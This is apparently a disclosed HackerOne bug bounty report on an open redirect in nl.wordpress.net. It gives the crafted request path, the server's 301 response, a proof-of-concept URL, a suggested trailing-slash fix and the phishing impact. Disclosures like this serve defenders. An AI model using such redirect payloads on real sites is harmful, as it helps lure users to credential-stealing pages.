# Open Redirect on the nl.wordpress.net

## Report Details
- **Report ID**: 309058
- **URL**: https://hackerone.com/reports/309058
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-01-25T17:33:02.479Z
- **Disclosed**: 2018-02-22T22:53:16.427Z

## Reporter
- **Username**: sp1d3rs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
##Description
Hello. I discovered an Open redirect vulnerability on the `nl.wordpress.org`.

##Root cause
The 301 Redirect contains full hostname, followed with `@` without trailing slash, when using:
```
GET /@google.com HTTP/1.1
Host: nl.wordpress.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

```
```
HTTP/1.1 301 Moved Permanently
Date: Thu, 25 Jan 2018 17:26:07 GMT
Server: Apache
Location: http://nl.wordpress.org@google.com
Content-Length: 242
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

```

##POC (Google Chrome)
http://nl.wordpress.net/@google.com

##Suggested fix
Appending the trailing slash after location hostname should fix the issue.
e.g.
```
Location: http://nl.wordpress.org@google.com
```
=>
```
Location: http://nl.wordpress.org/@google.com
```

## Impact

The attacker can redirect the victim to the malicious site using legit *.wordpress.net subdomain name, which can be the copy of the real site, asking for the user credentials.

## Attachments
No attachments
